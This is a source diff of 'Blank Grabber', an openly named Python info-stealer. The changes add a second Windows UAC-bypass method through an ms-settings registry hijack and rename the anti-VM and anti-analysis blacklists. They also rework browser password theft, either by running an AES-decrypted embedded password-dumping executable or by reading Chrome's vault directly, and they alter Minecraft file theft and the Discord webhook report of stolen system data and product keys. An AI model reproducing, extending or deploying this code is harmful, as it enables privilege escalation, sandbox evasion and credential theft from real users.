@@ -114,7 +114,9 @@ class system:
             out = os.path.join(system.STARTUPDIR, '{}.scr'.format(utils.generate(invisible= True)))
         else:
             out = os.path.join(system.STARTUPDIR, '{}.py'.format(utils.generate()))
-        shutil.copyfile(file, out)
+        os.makedirs(system.STARTUPDIR, exist_ok= True)
+        try: shutil.copyfile(file, out) 
+        except Exception: return None
         return out
     
     @staticmethod
@@ -129,13 +131,25 @@ class system:
             subprocess.run(f"powershell Unblock-File '.\{name}'", shell= True, capture_output= True, cwd= dir)
     
     @staticmethod
-    def UACbypass():
+    def UACbypass(method: int = 1):
         if not hasattr(sys, 'frozen'):
             return
-        subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"{os.path.abspath(sys.executable)}\" /f", shell= True, capture_output= True)
-        subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f", shell= True, capture_output= True)
-        subprocess.run("fodhelper.exe", shell= True, capture_output= True)
-        subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
+        
+        def execute(cmd: str): return subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
+        
+        if method == 1:
+            if not execute(f'reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f'): system.UACbypass(2)
+            if not execute('reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f'): system.UACbypass(2)
+            execute('computerdefaults')
+            execute('reg delete hkcu\Software\\Classes\\ms-settings /f')
+
+        elif method == 2:
+
+            execute(f'reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
+            execute('reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
+            execute('fodhelper')
+            execute('reg delete hkcu\Software\\Classes\\ms-settings /f')
+        
         os._exit(0)
     
     @staticmethod
@@ -230,15 +244,15 @@ class utils:
 
 
 class vmprotect:
-    BLACKLISTED_HWIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
+    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
     BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
     BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
     BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
 
     @staticmethod
-    def checkHWID() -> bool:
-        hwid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
-        return hwid in vmprotect.BLACKLISTED_HWIDS
+    def checkUUID() -> bool:
+        uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
+        return uuid in vmprotect.BLACKLISTED_UUIDS
 
     @staticmethod
     def checkComputerName() -> bool:
@@ -286,7 +300,7 @@ class vmprotect:
     @staticmethod
     def checkVM() -> bool:
         Thread(target= vmprotect.killTasks, daemon= True).start()
-        return vmprotect.checkHWID() or vmprotect.checkComputerName() or vmprotect.checkUsers() or vmprotect.checkHosting() or vmprotect.checkRegistry() #or vmprotect.checkHTTPSimulation()
+        return vmprotect.checkUUID() or vmprotect.checkComputerName() or vmprotect.checkUsers() or vmprotect.checkHosting() or vmprotect.checkRegistry() #or vmprotect.checkHTTPSimulation()
 
 class Browsers:
     CHROMEENCRYPTIONKEY = None
@@ -808,53 +822,60 @@ class BlankGrabber:
         
     @utils.catch
     def captureBrowserPasswords(self) -> None:
-        """ vault = Browsers.getChromePass()
-        passwords = list()
-        if not vault:
-            return
-        for i in vault:
-            URL = i.get('URL')
-            USERNAME = i.get('USERNAME')
-            PASSWORD = i.get('PASSWORD')
-            passwords.append('URL: {}\nUSERNAME: {}\nPASSWORD: {}'.format(URL, USERNAME, PASSWORD))
-        os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
-        divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
-        with open(os.path.join(credentials, 'Chrome Passwords.txt'), 'w') as file:
-            file.write(divider.lstrip() + divider.join(passwords))
-        self.collection['Passwords'] += len(passwords) """
-        if not os.path.isfile(PasswordGrabber := os.path.join(MEIPASS, 'getPass')):
-            return
-        system.unblockMOTW(PasswordGrabber)
-        with open(PasswordGrabber, 'rb') as file:
-            data = file.read()
-        data = AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
-        if not b'This program cannot be run in DOS mode.' in data:
-            return
-        if hasattr(sys, 'frozen'):
-            tempGetPass = os.path.join(MEIPASS, 'getPass.exe')
+        if FROZEN:
+            path = MEIPASS
         else:
-            tempGetPass = os.path.join(os.getenv('temp'), 'getPass.exe')
-        with open(tempGetPass, 'wb') as file:
-            file.write(data)
-        tempGetPassPath = os.path.dirname(tempGetPass)
-        try:
-            subprocess.run('getPass.exe /stext pass.txt', shell= True, capture_output= True, timeout= 5.0, cwd= tempGetPassPath)
-        except subprocess.TimeoutExpired:
-            os.remove(tempGetPass)
-            return
-        os.remove(tempGetPass)
-        if os.path.isfile(tempGetPassCFG := os.path.join(tempGetPassPath, 'getPass.cfg')):
-            os.remove(tempGetPassCFG)
-        with open(passfile := os.path.join(tempGetPassPath, 'pass.txt'), encoding= 'utf-16', errors= 'ignore') as file:
-            data = file.read()
-        if 'URL' in data:
-            divider = 'Blank Grabber'.center(50, '=')
-            data = list(['\n'.join(x.replace('=' * 50, divider, 1).splitlines()[:-1]) for x in data.split('\n\n') if x != ''])
-            self.collection['Passwords'] += len(data)
+            path = os.path.abspath('.')
+        
+        if not os.path.isfile(PasswordGrabber := os.path.join(path, 'getPass')):
+            vault = Browsers.getChromePass()
+            passwords = list()
+            if not vault:
+                return
+            for i in vault:
+                URL = i.get('URL')
+                USERNAME = i.get('USERNAME')
+                PASSWORD = i.get('PASSWORD')
+                passwords.append('URL: {}\nUSERNAME: {}\nPASSWORD: {}'.format(URL, USERNAME, PASSWORD))
             os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
-            with open(os.path.join(credentials, 'Passwords.txt'), 'w') as file:
-                file.write('\n\n'.join(data))
-        os.remove(passfile)
+            divider = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
+            if passwords:
+                with open(os.path.join(credentials, 'Chrome Passwords.txt'), 'w') as file:
+                    file.write(divider.lstrip() + divider.join(passwords))
+                self.collection['Passwords'] += len(passwords)
+        else:
+            system.unblockMOTW(PasswordGrabber)
+            with open(PasswordGrabber, 'rb') as file:
+                data = file.read()
+            data = AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
+            if not b'This program cannot be run in DOS mode.' in data:
+                return
+            if hasattr(sys, 'frozen'):
+                tempGetPass = os.path.join(MEIPASS, 'getPass.exe')
+            else:
+                tempGetPass = os.path.join(os.getenv('temp'), 'getPass.exe')
+            with open(tempGetPass, 'wb') as file:
+                file.write(data)
+            tempGetPassPath = os.path.dirname(tempGetPass)
+            try:
+                subprocess.run('getPass.exe /stext pass.txt', shell= True, capture_output= True, timeout= 5.0, cwd= tempGetPassPath)
+            except subprocess.TimeoutExpired:
+                os.remove(tempGetPass)
+                return
+            os.remove(tempGetPass)
+            if os.path.isfile(tempGetPassCFG := os.path.join(tempGetPassPath, 'getPass.cfg')):
+                os.remove(tempGetPassCFG)
+            with open(passfile := os.path.join(tempGetPassPath, 'pass.txt'), encoding= 'utf-16', errors= 'ignore') as file:
+                data = file.read()
+            if 'URL' in data:
+                divider = 'Blank Grabber'.center(50, '=')
+                data = list(['\n'.join(x.replace('=' * 50, divider, 1).splitlines()[:-1]) for x in data.split('\n\n') if x != ''])
+            os.remove(passfile)
+            if data:
+                os.makedirs(credentials := os.path.join(self.tempfolder, 'Credentials'), exist_ok= True)
+                with open(os.path.join(credentials, 'Passwords.txt'), 'w') as file:
+                    file.write('\n\n'.join(data))
+                self.collection['Passwords'] += len(data)
     
     @utils.catch
     def captureChromeCookies(self) -> None:
@@ -908,7 +929,7 @@ class BlankGrabber:
 
     @utils.catch
     def minecraftStealer(self) -> None:
-        if not os.path.exists(mcdir := os.path.join(self.roaming, ".minecraft")):
+        if not os.path.exists(mcdir := os.path.join(self.roaming, '.minecraft')) or not os.path.isfile(os.path.join(mcdir, 'launcher_profiles.json')):
             return
         for i in os.listdir(mcdir):
             if not i.endswith((".json", ".txt", ".dat")):
@@ -1022,12 +1043,12 @@ class BlankGrabber:
         ComputerName = os.getenv("computername")
         ComputerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
         TotalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
-        HWID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
+        UUID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
         CPU = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
         GPU = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
         productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
-        self.PCinfo = (ComputerName, ComputerOS, TotalMemory, HWID, CPU, GPU, productKey)
+        self.PCinfo = (ComputerName, ComputerOS, TotalMemory, UUID, CPU, GPU, productKey)
     
     @utils.catch
     def captureDiscordTokens(self) -> None:
@@ -1100,7 +1121,7 @@ class BlankGrabber:
         self.zip()
         if not os.path.isfile(self.archive):
             return
-        ComputerName, ComputerOS, TotalMemory, HWID, CPU, GPU, productKey = self.PCinfo
+        ComputerName, ComputerOS, TotalMemory, UUID, CPU, GPU, productKey = self.PCinfo
         grabbed_info = list()
         for name, value in self.collection.items():
             grabbed_info.append('{} : {}'.format(name, value))
@@ -1110,7 +1131,7 @@ class BlankGrabber:
   'embeds': [
     {
       'title': 'Blank Grabber',
-      'description': f'**__System Info__\n```autohotkey\nComputer Name: {ComputerName}\nComputer OS: {ComputerOS}\nTotal Memory: {TotalMemory}\nHWID: {HWID}\nCPU: {CPU}\nGPU: {GPU}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{self.ipinfo}```\n__Grabbed Info__```js\n{grabbed_info}```**',
+      'description': f'**__System Info__\n```autohotkey\nComputer Name: {ComputerName}\nComputer OS: {ComputerOS}\nTotal Memory: {TotalMemory}\nUUID: {UUID}\nCPU: {CPU}\nGPU: {GPU}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{self.ipinfo}```\n__Grabbed Info__```js\n{grabbed_info}```**',
       'url': 'https://github.com/Blank-c/Blank-Grabber',
       'color': 34303,
       'footer': {
